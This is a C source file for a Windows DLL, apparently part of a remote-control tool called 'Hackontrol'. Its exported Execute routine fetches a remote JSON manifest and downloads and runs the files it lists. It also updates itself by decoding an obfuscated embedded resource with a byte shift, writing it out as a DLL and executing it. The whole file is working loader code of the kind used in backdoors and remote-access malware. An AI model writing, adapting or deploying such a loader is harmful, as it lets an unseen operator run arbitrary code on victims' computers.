#include <libkhopancurl.h>
#include <libhackontrol.h>
#include "Execute.h"
#include "resource.h"

//#define HACKONTROL_OVERRIDE

#ifndef HACKONTROL_OVERRIDE
#ifdef _DEBUG
#define HACKONTROL_NO_DOWNLOAD_LATEST_JSON_FILE
#define HACKONTROL_NO_SELF_UPDATE
//#define HACKONTROL_NO_DOWNLOAD_FILE
//#define HACKONTROL_NO_EXECUTE_FILE
#endif
#endif

static HINSTANCE instance;

BOOL WINAPI DllMain(HINSTANCE application, DWORD reason, LPVOID reserved) {
	instance = application;
	return TRUE;
}

static BOOL selfUpdate(const cJSON* const root, const LPCWSTR folderHackontrol) {
	cJSON* selfField = cJSON_GetObjectItem(root, "self");

	if(!selfField || !cJSON_IsObject(selfField)) {
		return FALSE;
	}

	cJSON* urlField = cJSON_GetObjectItem(selfField, "url");

	if(!urlField || !cJSON_IsString(urlField)) {
		return FALSE;
	}

	LPSTR url = cJSON_GetStringValue(urlField);

	if(!url) {
		return FALSE;
	}

	LPWSTR fileLibdll32 = KHOPANFormatMessage(L"%ws\\" FILE_LIBDLL32, folderHackontrol);

	if(!fileLibdll32) {
		return FALSE;
	}

	BOOL result = ExecuteHashFileCheck(selfField, fileLibdll32);
	LocalFree(fileLibdll32);

	if(result) {
		return TRUE;
	}

	HRSRC handle = FindResourceW(instance, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(!handle) {
		return FALSE;
	}

	DWORD size = SizeofResource(instance, handle);

	if(!size) {
		return FALSE;
	}

	HGLOBAL resource = LoadResource(instance, handle);

	if(!resource) {
		return FALSE;
	}

	PBYTE data = LockResource(resource);

	if(!data) {
		return FALSE;
	}

	PBYTE buffer = LocalAlloc(LMEM_FIXED, size);

	if(!buffer) {
		return FALSE;
	}

	for(DWORD i = 0; i < size; i++) {
		buffer[i] = (data[i] - 18) % 0xFF;
	}

	LPWSTR fileLibupdate32 = KHOPANFormatMessage(L"%ws\\" FILE_LIBUPDATE32, folderHackontrol);

	if(!fileLibupdate32) {
		LocalFree(buffer);
		return FALSE;
	}

	result = HackontrolWriteFile(fileLibupdate32, buffer, size);
	LocalFree(buffer);

	if(!result) {
		LocalFree(fileLibupdate32);
		return FALSE;
	}

	LPSTR argumentLibupdate32 = KHOPANFormatANSI("%lu %s", GetCurrentProcessId(), url);

	if(!argumentLibupdate32) {
		LocalFree(fileLibupdate32);
		return FALSE;
	}

	KHOPANExecuteDynamicLibrary(fileLibupdate32, FUNCTION_LIBUPDATE32, argumentLibupdate32);
	LocalFree(argumentLibupdate32);
	LocalFree(fileLibupdate32);
	return TRUE;
}

__declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	DWORD processIdentifier = 0;
	BOOL update = TRUE;
	PBYTE buffer;

	if(!argument || !strlen(argument)) {
		goto initializeGlobal;
	}

	buffer = (PBYTE) KHOPANFormatMessage(L"%S", argument);

	if(!buffer) {
		goto initializeGlobal;
	}

	int count;
	LPWSTR* arguments = CommandLineToArgvW((LPCWSTR) buffer, &count);
	LocalFree(buffer);

	if(!arguments) {
		goto initializeGlobal;
	}

	if(count > 0) {
		processIdentifier = (DWORD) _wtoll(arguments[0]);
	}

	update = count > 1 && _wtoll(arguments[1]) ? FALSE : TRUE;
	LocalFree(arguments);
initializeGlobal:
	CURLcode code = curl_global_init(CURL_GLOBAL_ALL);

	if(code != CURLE_OK) {
		KHOPANERRORMESSAGE_CURL(code, L"curl_global_init");
		return;
	}

	cJSON* root = NULL;
	HANDLE handle;
#ifdef HACKONTROL_NO_DOWNLOAD_LATEST_JSON_FILE
	handle = CreateFileW(L"D:\\GitHub Repository\\Hackontrol\\system\\latest.json", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if(handle == INVALID_HANDLE_VALUE) {
		KHOPANLASTERRORMESSAGE_WIN32(L"CreateFileW");
		goto cleanupGlobal;
	}

	LARGE_INTEGER integer;

	if(!GetFileSizeEx(handle, &integer)) {
		KHOPANLASTERRORMESSAGE_WIN32(L"GetFileSizeEx");
		CloseHandle(handle);
		goto cleanupGlobal;
	}

	buffer = LocalAlloc(LMEM_FIXED, integer.LowPart + 1);

	if(!buffer) {
		KHOPANLASTERRORMESSAGE_WIN32(L"LocalAlloc");
		CloseHandle(handle);
		goto cleanupGlobal;
	}

	DWORD bytesRead;

	if(!ReadFile(handle, buffer, integer.LowPart, &bytesRead, NULL)) {
		KHOPANLASTERRORMESSAGE_WIN32(L"ReadFile");
		LocalFree(buffer);
		CloseHandle(handle);
		goto cleanupGlobal;
	}

	buffer[integer.LowPart] = 0;
	root = cJSON_Parse(buffer);
	LocalFree(buffer);
	CloseHandle(handle);
#else
	DATASTREAM stream = {0};
	code = HackontrolDownload(URL_LATEST_FILE, &stream, TRUE, TRUE);

	if(code != CURLE_OK) {
		KHOPANERRORMESSAGE_CURL(code, L"HackontrolDownload");
		goto cleanupGlobal;
	}

	if(!KHOPANStreamAdd(&stream, "", 1)) {
		KHOPANLASTERRORMESSAGE_WIN32(L"KHOPANStreamAdd");
		goto cleanupGlobal;
	}

	root = cJSON_Parse(stream.data);
	KHOPANStreamFree(&stream);
#endif
	if(!root) {
		MessageBoxW(NULL, L"Unable to parse JSON document", L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto cleanupGlobal;
	}

	if(!cJSON_IsObject(root)) {
		KHOPANERRORMESSAGE_WIN32(ERROR_BAD_FORMAT, L"cJSON_IsObject");
		goto deleteJson;
	}

	LPWSTR folderHackontrol = HackontrolGetHomeDirectory();

	if(!folderHackontrol) {
		KHOPANLASTERRORMESSAGE_WIN32(L"HackontrolGetHomeDirectory");
		goto deleteJson;
	}

	if(!HackontrolCreateDirectory(folderHackontrol)) {
		KHOPANLASTERRORMESSAGE_WIN32(L"HackontrolCreateDirectory");
		goto freeFolderHackontrol;
	}
#ifndef HACKONTROL_NO_SELF_UPDATE
	if(update && selfUpdate(root, folderHackontrol)) {
		goto freeFolderHackontrol;
	}
#endif
	if(processIdentifier && (handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processIdentifier))) {
		WaitForSingleObject(handle, INFINITE);
		CloseHandle(handle);
	}
#ifndef HACKONTROL_NO_DOWNLOAD_FILE
	if(update) {
		ExecuteDownload(root, folderHackontrol);
	}
#endif
#ifndef HACKONTROL_NO_EXECUTE_FILE
	ExecuteExecute(root, folderHackontrol);
#endif
freeFolderHackontrol:
	LocalFree(folderHackontrol);
deleteJson:
	cJSON_Delete(root);
cleanupGlobal:
	curl_global_cleanup();
}
